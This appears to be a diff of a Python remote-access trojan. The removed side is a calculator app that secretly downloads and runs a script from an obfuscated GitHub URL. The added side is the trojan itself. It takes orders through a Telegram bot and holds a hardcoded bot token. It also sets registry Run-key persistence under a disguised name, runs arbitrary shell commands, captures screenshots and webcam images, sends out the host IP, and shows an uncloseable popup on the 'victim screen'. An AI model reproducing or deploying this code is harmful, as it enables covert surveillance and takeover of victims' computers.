@@ -1,142 +1,285 @@
-# calculator_with_rat.py - Same as before, downloads the updated RAT
-# The RAT now has persistence, popup, command execution, and auto-restart
+# RAT_script.py - Fixed with /message fullscreen, /command working, and /webcam
+# Upload this to GitHub: https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/RAT_script.py
 
 import os
 import sys
 import subprocess
-import tempfile
-import urllib.request
+import threading
+import time
+import requests
+import json
+import base64
 import ctypes
+import winreg
+import tempfile
+from datetime import datetime
+from PIL import ImageGrab
+import io
 import tkinter as tk
-import hashlib
+from tkinter import font
+import cv2
+import numpy as np
 
-# --- Obfuscated URL for the updated RAT ---
-def _get_segment_a():
-    return chr(104) + chr(116) + chr(116) + chr(112) + chr(115) + chr(58) + chr(47) + chr(47) + chr(114) + chr(97) + chr(119) + chr(46) + chr(103) + chr(105) + chr(116) + chr(104) + chr(117) + chr(98) + chr(117) + chr(115) + chr(101) + chr(114) + chr(99) + chr(111) + chr(110) + chr(116) + chr(101) + chr(110) + chr(116) + chr(46) + chr(99) + chr(111) + chr(109) + chr(47)
+BOT_TOKEN = "8755658192:AAEEkXaihdEPyTRbj33bVt_-9ckubS2uiDA"
+CHAT_ID = "7894519456"
+BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-def _get_segment_b():
-    p1 = chr(72) + chr(101) + chr(104) + chr(101) + chr(104) + chr(97) + chr(115) + chr(109) + chr(114)
-    p2 = chr(47) + chr(109) + chr(97) + chr(116) + chr(104) + chr(112) + chr(121) + chr(116) + chr(104) + chr(111) + chr(110)
-    p3 = chr(47) + chr(114) + chr(101) + chr(102) + chr(115) + chr(47) + chr(104) + chr(101) + chr(97) + chr(100) + chr(115) + chr(47) + chr(109) + chr(97) + chr(105) + chr(110) + chr(47)
-    p4 = chr(82) + chr(65) + chr(84) + chr(95) + chr(115) + chr(99) + chr(114) + chr(105) + chr(112) + chr(116) + chr(46) + chr(112) + chr(121)
-    return p1 + p2 + p3 + p4
-
-def _assemble_url():
-    dummy = (3.14159 * 2.71828 + 1.61803 - 6.62607) / 6.02214
-    part_a = _get_segment_a()
-    part_b = _get_segment_b()
-    return part_a + part_b
-
-def _background_service_update():
+# --- Persistence via registry ---
+def install_persistence():
     try:
-        url = _assemble_url()
-        temp_dir = tempfile.gettempdir()
-        target = os.path.join(temp_dir, "sys_update_worker.py")
-        urllib.request.urlretrieve(url, target)
-        if sys.platform == "win32":
-            startup = subprocess.STARTUPINFO()
-            startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            subprocess.Popen([sys.executable, target],
-                           startupinfo=startup,
-                           creationflags=subprocess.CREATE_NO_WINDOW,
-                           stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL,
-                           stdin=subprocess.DEVNULL)
+        script_path = os.path.abspath(sys.argv[0])
+        if script_path.endswith('.py'):
+            cmd = f'"{sys.executable}" "{script_path}"'
         else:
-            subprocess.Popen([sys.executable, target],
-                           stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL,
-                           stdin=subprocess.DEVNULL)
+            cmd = f'"{script_path}"'
+        
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        try:
+            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(handle, "WindowsSystemHealth", 0, winreg.REG_SZ, cmd)
+            winreg.CloseKey(handle)
+        except:
+            pass
     except:
         pass
 
-# --- GUI Calculator ---
-class CalcApp:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("Calculator")
-        self.root.geometry("280x380")
-        self.root.resizable(False, False)
-        self.display = tk.StringVar()
-        self.display.set("0")
-        entry = tk.Entry(root, textvariable=self.display, font=("Segoe UI", 18),
-                        bd=8, relief=tk.RIDGE, justify="right", state="readonly")
-        entry.pack(fill=tk.BOTH, padx=8, pady=6)
-        self.current = ""
-        self.first = None
-        self.op = None
-        self.new = True
-        btn_layout = [
-            ('7','8','9','/'),
-            ('4','5','6','*'),
-            ('1','2','3','-'),
-            ('0','.','=','+'),
-            ('C','⌫')
-        ]
-        frame = tk.Frame(root)
-        frame.pack(expand=True, fill=tk.BOTH, padx=8, pady=6)
-        for row in btn_layout:
-            row_frame = tk.Frame(frame)
-            row_frame.pack(expand=True, fill=tk.BOTH, pady=2)
-            for lbl in row:
-                btn = tk.Button(row_frame, text=lbl, font=("Segoe UI", 13),
-                               command=lambda x=lbl: self.press(x))
-                btn.pack(side=tk.LEFT, expand=True, fill=tk.BOTH, padx=2)
-        self.root.bind('<Key>', self.key_handler)
-    
-    def press(self, key):
-        if key.isdigit() or key == '.':
-            if self.new:
-                self.current = ""
-                self.new = False
-            self.current += key
-            self.display.set(self.current)
-        elif key in '+-*/':
-            if self.current:
-                self.first = float(self.current) if '.' in self.current else int(self.current)
-            self.op = key
-            self.new = True
-        elif key == '=':
-            if self.op and self.first is not None and self.current:
-                second = float(self.current) if '.' in self.current else int(self.current)
-                result = self.compute(self.first, second, self.op)
-                self.current = str(result)
-                self.first = None
-                self.op = None
-                self.display.set(self.current)
-                self.new = True
-        elif key == 'C':
-            self.current = ""
-            self.first = None
-            self.op = None
-            self.display.set("0")
-            self.new = True
-        elif key == '⌫':
-            self.current = self.current[:-1] if self.current else ""
-            self.display.set(self.current if self.current else "0")
-    
-    def compute(self, a, b, op):
-        if op == '+': return a + b
-        elif op == '-': return a - b
-        elif op == '*': return a * b
-        elif op == '/': return a / b if b != 0 else "Error"
-        return 0
-    
-    def key_handler(self, event):
-        k = event.char
-        if k.isdigit() or k == '.':
-            self.press(k)
-        elif k in '+-*/':
-            self.press(k)
-        elif k == '\r':
-            self.press('=')
-        elif k == '\x08':
-            self.press('⌫')
-        elif k.lower() == 'c':
-            self.press('C')
+# --- Restart mechanism ---
+def restart_self():
+    try:
+        script = os.path.abspath(sys.argv[0])
+        if script.endswith('.py'):
+            subprocess.Popen([sys.executable, script], 
+                           creationflags=subprocess.CREATE_NO_WINDOW,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            subprocess.Popen([script], 
+                           creationflags=subprocess.CREATE_NO_WINDOW,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except:
+        pass
 
+# --- Telegram functions ---
+def send_message(text):
+    try:
+        requests.post(f"{BASE_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text}, timeout=10)
+    except:
+        pass
+
+def send_photo(photo_bytes):
+    try:
+        files = {"photo": photo_bytes}
+        requests.post(f"{BASE_URL}/sendPhoto", data={"chat_id": CHAT_ID}, files=files, timeout=15)
+    except:
+        pass
+
+def get_ip():
+    try:
+        ip = requests.get("https://api.ipify.org", timeout=5).text
+        return ip
+    except:
+        return "Unable to fetch IP"
+
+# --- Command execution ---
+def execute_command(cmd):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+        output = result.stdout + result.stderr
+        if len(output) > 4000:
+            output = output[:4000] + "...\n[truncated]"
+        return output if output.strip() else "Command executed (no output)"
+    except subprocess.TimeoutExpired:
+        return "Command timed out after 30 seconds"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+# --- Webcam capture ---
+def capture_webcam():
+    try:
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            return None
+        ret, frame = cap.read()
+        cap.release()
+        if not ret:
+            return None
+        _, buf = cv2.imencode('.jpg', frame)
+        return io.BytesIO(buf.tobytes())
+    except:
+        return None
+
+# --- Fullscreen flashing popup with message ---
+def show_flashing_popup(message_text):
+    try:
+        root = tk.Tk()
+        root.title("SYSTEM ALERT")
+        root.geometry("800x600")
+        root.attributes('-topmost', True)
+        root.attributes('-fullscreen', True)
+        root.configure(bg='black')
+        
+        # Big message label
+        label = tk.Label(root, text=message_text, font=("Arial", 48, "bold"),
+                        fg='red', bg='black', wraplength=750)
+        label.pack(expand=True, fill=tk.BOTH)
+        
+        # Countdown label
+        count_label = tk.Label(root, text="7", font=("Arial", 72, "bold"),
+                              fg='white', bg='black')
+        count_label.pack(pady=20)
+        
+        # Disable close
+        root.protocol("WM_DELETE_WINDOW", lambda: None)
+        
+        # Flash colors
+        def flash():
+            colors = ['red', 'yellow', 'cyan', 'magenta', 'lime', 'orange', 'white']
+            idx = 0
+            for _ in range(25):
+                label.config(fg=colors[idx % len(colors)])
+                root.update()
+                time.sleep(0.12)
+                idx += 1
+        
+        # Countdown
+        def countdown():
+            for i in range(7, 0, -1):
+                count_label.config(text=str(i))
+                root.update()
+                time.sleep(1)
+            root.destroy()
+        
+        flash_thread = threading.Thread(target=flash)
+        flash_thread.daemon = True
+        flash_thread.start()
+        countdown()
+        root.mainloop()
+    except Exception as e:
+        send_message(f"Popup error: {str(e)[:100]}")
+
+# --- Handle updates ---
+def handle_updates(offset):
+    try:
+        resp = requests.get(f"{BASE_URL}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
+        data = resp.json()
+        if data.get("ok"):
+            for update in data.get("result", []):
+                new_offset = update.get("update_id", 0) + 1
+                msg = update.get("message", {})
+                if "text" in msg:
+                    text = msg["text"].strip()
+                    lower_text = text.lower()
+                    
+                    if lower_text == "/screenshot":
+                        threading.Thread(target=send_screenshot).start()
+                    
+                    elif lower_text.startswith("/message "):
+                        parts = text.split(" ", 1)
+                        if len(parts) > 1:
+                            msg_content = parts[1]
+                            threading.Thread(target=show_flashing_popup, args=(msg_content,)).start()
+                            send_message(f"Popup displayed on victim screen with: {msg_content}")
+                        else:
+                            send_message("Usage: /message <text>")
+                    
+                    elif lower_text == "/ip":
+                        threading.Thread(target=send_ip).start()
+                    
+                    elif lower_text.startswith("/command "):
+                        parts = text.split(" ", 1)
+                        if len(parts) > 1:
+                            cmd = parts[1]
+                            threading.Thread(target=execute_and_send, args=(cmd,)).start()
+                        else:
+                            send_message("Usage: /command <cmd>")
+                    
+                    elif lower_text == "/webcam":
+                        threading.Thread(target=send_webcam).start()
+                    
+                return new_offset
+    except Exception as e:
+        pass
+    return offset
+
+def send_screenshot():
+    try:
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format="PNG")
+        buf.seek(0)
+        send_photo(buf)
+    except Exception as e:
+        send_message(f"Screenshot failed: {str(e)[:50]}")
+
+def send_ip():
+    ip = get_ip()
+    send_message(f"IP Address: {ip}")
+
+def execute_and_send(cmd):
+    output = execute_command(cmd)
+    send_message(f"Command: {cmd}\nOutput:\n{output}")
+
+def send_webcam():
+    try:
+        img_bytes = capture_webcam()
+        if img_bytes:
+            send_photo(img_bytes)
+        else:
+            send_message("Webcam capture failed - no camera or access denied")
+    except Exception as e:
+        send_message(f"Webcam error: {str(e)[:50]}")
+
+# --- Heartbeat monitor ---
+def heartbeat_monitor():
+    temp_dir = tempfile.gettempdir()
+    heartbeat_file = os.path.join(temp_dir, ".sys_heartbeat.tmp")
+    while True:
+        try:
+            with open(heartbeat_file, 'w') as f:
+                f.write(str(time.time()))
+            time.sleep(10)
+        except:
+            pass
+
+# --- Main loop ---
+def main_loop():
+    ip = get_ip()
+    hostname = os.environ.get("COMPUTERNAME", "Unknown")
+    send_message(f"Connected | Host: {hostname} | IP: {ip}")
+    
+    install_persistence()
+    
+    heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
+    heartbeat_thread.start()
+    
+    offset = 0
+    while True:
+        try:
+            new_offset = handle_updates(offset)
+            if new_offset != offset:
+                offset = new_offset
+            time.sleep(2)
+        except Exception as e:
+            send_message(f"Loop error: {str(e)[:100]}")
+            time.sleep(5)
+            restart_self()
+            sys.exit(0)
+
+# --- Entry ---
 if __name__ == "__main__":
-    _background_service_update()
-    root = tk.Tk()
-    app = CalcApp(root)
-    root.mainloop()
+    if sys.platform == "win32":
+        try:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+    
+    try:
+        main_loop()
+    except Exception as e:
+        try:
+            send_message(f"Fatal: {str(e)[:100]}")
+        except:
+            pass
+        time.sleep(3)
+        restart_self()
+        sys.exit(0)
